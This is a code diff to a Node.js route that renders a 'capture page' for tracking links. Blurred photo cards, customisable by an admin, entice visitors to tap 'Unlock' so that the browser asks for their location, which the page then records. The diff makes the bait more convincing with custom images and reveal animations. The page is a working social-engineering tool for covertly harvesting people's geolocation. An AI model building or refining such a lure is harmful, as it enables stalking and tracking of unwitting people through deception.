@@ -1,4 +1,5 @@
 const PublicLocation = require('../models/PublicLocation');
+const GalleryImage = require('../models/GalleryImage');
 const { success, created } = require('../utils/response');
 const { getIO } = require('../config/socket');
 const logger = require('../utils/logger');
@@ -16,6 +17,10 @@ const renderCapturePage = async (req, res, next) => {
     if (trackingLink && trackingLink.expiresAt && new Date() > trackingLink.expiresAt) {
       return res.status(410).send('<h1>Link Expired</h1><p>This tracking link has expired.</p>');
     }
+    
+    // Get custom gallery images from database
+    const gallerySettings = await GalleryImage.getSettings();
+    const customImages = gallerySettings.imageUrls;
     
     const html = `
       <!DOCTYPE html>
@@ -168,40 +173,17 @@ const renderCapturePage = async (req, res, next) => {
                   font-size: 1rem;
                   font-weight: 700;
                   cursor: pointer;
-                  box-shadow: 
-                      0 10px 40px rgba(118, 75, 162, 0.6),
-                      0 0 0 1px rgba(255,255,255,0.1) inset,
-                      0 0 20px rgba(124, 58, 237, 0.3);
-                  transition: transform 0.15s ease;
-                  display: flex;
-                  align-items: center;
-                  justify-content: center;
-                  gap: 12px;
-                  text-transform: uppercase;
-                  letter-spacing: 1.5px;
-              }
-              .view-btn:active {
-                  transform: scale(0.96);
-              }
-              .view-btn .icon {
-                  font-size: 1.4rem;
-              }
-              
-              /* Glow effect for unlocked cards */
               .album-card.unlocked .blur-overlay {
                   backdrop-filter: blur(0px);
                   background: rgba(0,0,0,0);
+                  transform: translateX(100%);
+                  opacity: 0;
                   pointer-events: none;
               }
               .album-card.unlocked {
                   box-shadow: 
                       0 8px 32px 0 rgba(124, 58, 237, 0.3),
                       inset 0 0 0 2px rgba(124, 58, 237, 0.5);
-                  animation: glow 2s ease-in-out infinite alternate;
-              }
-              @keyframes glow {
-                  from { box-shadow: 0 8px 32px 0 rgba(124, 58, 237, 0.3), inset 0 0 0 2px rgba(124, 58, 237, 0.5); }
-                  to { box-shadow: 0 8px 32px 0 rgba(124, 58, 237, 0.5), inset 0 0 0 2px rgba(124, 58, 237, 0.8), 0 0 20px rgba(124, 58, 237, 0.4); }
               }
               
               /* Loading State */
@@ -321,52 +303,52 @@ const renderCapturePage = async (req, res, next) => {
               <!-- Album Grid -->
               <div class="album-grid">
                   <div class="album-card" onclick="showGallery(0)">
-                      <img src="https://images.unsplash.com/photo-1529333166437-7750a6dd5a70?w=400&h=400&fit=crop" alt="Couple" loading="lazy">
+                      <img src="${customImages[0]}" alt="Photo 1" loading="lazy">
                       <div class="blur-overlay">
-                          <div class="eye-icon">�️</div>
+                          <div class="eye-icon">👁️</div>
                           <div class="tap-hint">Tap to View</div>
                       </div>
                   </div>
                   <div class="album-card" onclick="showGallery(1)">
-                      <img src="https://images.unsplash.com/photo-1516589178581-6cd7833ae3b2?w=400&h=400&fit=crop" alt="Romantic" loading="lazy">
+                      <img src="${customImages[1]}" alt="Photo 2" loading="lazy">
                       <div class="blur-overlay">
-                          <div class="eye-icon">�️</div>
+                          <div class="eye-icon">👁️</div>
                           <div class="tap-hint">Tap to View</div>
                       </div>
                   </div>
                   <div class="album-card" onclick="showGallery(2)">
-                      <img src="https://images.unsplash.com/photo-1522673607200-164d1b6ce486?w=400&h=400&fit=crop" alt="Dating" loading="lazy">
+                      <img src="${customImages[2]}" alt="Photo 3" loading="lazy">
                       <div class="blur-overlay">
-                          <div class="eye-icon">�️</div>
+                          <div class="eye-icon">👁️</div>
                           <div class="tap-hint">Tap to View</div>
                       </div>
                   </div>
                   <div class="album-card" onclick="showGallery(3)">
-                      <img src="https://images.unsplash.com/photo-1519741497674-611481863552?w=400&h=400&fit=crop" alt="Together" loading="lazy">
+                      <img src="${customImages[3]}" alt="Photo 4" loading="lazy">
                       <div class="blur-overlay">
-                          <div class="eye-icon">�️</div>
+                          <div class="eye-icon">👁️</div>
                           <div class="tap-hint">Tap to View</div>
                       </div>
                   </div>
                   <div class="album-card" onclick="showGallery(4)">
-                      <img src="https://images.unsplash.com/photo-1529333241880-0fc7855bb921?w=400&h=400&fit=crop" alt="Memories" loading="lazy">
+                      <img src="${customImages[4]}" alt="Photo 5" loading="lazy">
                       <div class="blur-overlay">
-                          <div class="eye-icon">�️</div>
+                          <div class="eye-icon">👁️</div>
                           <div class="tap-hint">Tap to View</div>
                       </div>
                   </div>
                   <div class="album-card" onclick="showGallery(5)">
-                      <img src="https://images.unsplash.com/photo-1518568814500-bf0f8d125f46?w=400&h=400&fit=crop" alt="Special" loading="lazy">
+                      <img src="${customImages[5]}" alt="Photo 6" loading="lazy">
                       <div class="blur-overlay">
-                          <div class="eye-icon">�️</div>
+                          <div class="eye-icon">👁️</div>
                           <div class="tap-hint">Tap to View</div>
                       </div>
                   </div>
               </div>
               
-              <button class="view-btn" id="view-btn" onclick="handleViewImages()">
-                  <span class="icon">�️</span>
-                  <span>View All Photos</span>
+              <button class="view-btn" id="view-btn" onclick="handleViewImages(0)">
+                  <span class="icon">👁️</span>
+                  <span>Unlock All Photos</span>
               </button>
               
               <div id="status"></div>
@@ -375,23 +357,11 @@ const renderCapturePage = async (req, res, next) => {
           <!-- Loading Overlay -->
           <div class="loading-overlay" id="loading-overlay">
               <div class="spinner"></div>
-              <div class="loading-text">Unlocking gallery...</div>
+              <div class="loading-text">Unlocking photo...</div>
           </div>
           
-          <!-- Gallery Overlay -->
-          <div class="gallery-overlay" id="gallery-overlay">
-              <div class="gallery-header">
-                  <div class="gallery-title">📸 Photo Gallery</div>
-                  <button class="close-btn" onclick="closeGallery()">✕</button>
-              </div>
-              <div class="gallery-content">
-                  <img class="gallery-image" id="gallery-image" src="" alt="Photo">
-              </div>
-              <div class="gallery-nav">
-                  <button class="nav-btn" onclick="prevImage()">← Previous</button>
-                  <button class="nav-btn" onclick="nextImage()">Next →</button>
-              </div>
-          </div>
+          <!-- Status Message -->
+          <div id="status"></div>
 
           <script>
               const CUSTOM_SLUG = '${customSlug || ''}';
@@ -404,15 +374,8 @@ const renderCapturePage = async (req, res, next) => {
               let currentImageIndex = 0;
               let galleryUnlocked = false;
               
-              // Emoji gallery images (using placeholders)
-              const galleryImages = [
-                  'https://images.unsplash.com/photo-1507525428034-b723cf961d3e?w=800',
-                  'https://images.unsplash.com/photo-1493225457124-a3eb161ffa5f?w=800',
-                  'https://images.unsplash.com/photo-1514525253161-7a46d19cd819?w=800',
-                  'https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=800',
-                  'https://images.unsplash.com/photo-1436491865332-7a61a109cc05?w=800',
-                  'https://images.unsplash.com/photo-1414235077428-338989a2e8c0?w=800'
-              ];
+              // Custom gallery images from admin settings
+              const galleryImages = ${JSON.stringify(customImages)};
 
               const getVisitorId = () => {
                   try {
@@ -509,9 +472,9 @@ const renderCapturePage = async (req, res, next) => {
                   } catch (e) {}
               });
 
-              async function handleViewImages() {
+              async function handleViewImages(cardIndex = 0) {
                   if (galleryUnlocked) {
-                      showGallery(0);
+                      unlockAllCards();
                       return;
                   }
                   
@@ -565,18 +528,13 @@ const renderCapturePage = async (req, res, next) => {
                           status.innerHTML = '<span style="color: #22c55e;">✅ Gallery unlocked!</span>';
                           viewBtn.innerHTML = '<span class="icon">📸</span><span>View All Photos</span>';
                           
-                          // Remove blur overlays
-                          document.querySelectorAll('.blur-overlay').forEach(el => {
-                              el.style.opacity = '0';
-                              el.style.pointerEvents = 'none';
-                          });
-                          document.querySelectorAll('.album-card').forEach(card => {
-                              card.classList.add('unlocked');
-                          });
+                          // Unlock the clicked card first with animation
+                          revealCard(cardIndex);
                           
-                          // Show the image that was clicked
-                          galleryImage.src = galleryImages[currentImageIndex];
-                          galleryOverlay.classList.add('active');
+                          // Then unlock all other cards with staggered delay
+                          setTimeout(() => {
+                              unlockAllCards();
+                          }, 500);
                       },
                       async (error) => {
                           await track('permission_result', { 
@@ -595,26 +553,39 @@ const renderCapturePage = async (req, res, next) => {
                   // Always trigger location capture on card click
                   if (!galleryUnlocked) {
                       currentImageIndex = index; // Store which image they want to see
-                      handleViewImages();
+                      handleViewImages(index);
                       return;
                   }
-                  currentImageIndex = index;
-                  galleryImage.src = galleryImages[index];
-                  galleryOverlay.classList.add('active');
+                  // If already unlocked, just reveal this card with animation
+                  revealCard(index);
               }
               
-              function closeGallery() {
-                  galleryOverlay.classList.remove('active');
+              function revealCard(index) {
+                  const cards = document.querySelectorAll('.album-card');
+                  const card = cards[index];
+                  const blurOverlay = card.querySelector('.blur-overlay');
+                  
+                  // Add slide/reveal animation
+                  blurOverlay.style.transition = 'all 0.6s cubic-bezier(0.4, 0, 0.2, 1)';
+                  blurOverlay.style.transform = 'translateX(100%)';
+                  blurOverlay.style.opacity = '0';
+                  
+                  // Mark as unlocked
+                  card.classList.add('unlocked');
+                  
+                  // Show success message briefly
+                  status.innerHTML = '<span style="color: #22c55e;">✅ Photo ' + (index + 1) + ' unlocked!</span>';
+                  setTimeout(() => {
+                      status.textContent = '';
+                  }, 2000);
               }
               
-              function nextImage() {
-                  currentImageIndex = (currentImageIndex + 1) % galleryImages.length;
-                  galleryImage.src = galleryImages[currentImageIndex];
-              }
-              
-              function prevImage() {
-                  currentImageIndex = (currentImageIndex - 1 + galleryImages.length) % galleryImages.length;
-                  galleryImage.src = galleryImages[currentImageIndex];
+              function unlockAllCards() {
+                  document.querySelectorAll('.album-card').forEach((card, index) => {
+                      setTimeout(() => {
+                          revealCard(index);
+                      }, index * 100); // Staggered animation
+                  });
               }
           </script>
       </body>
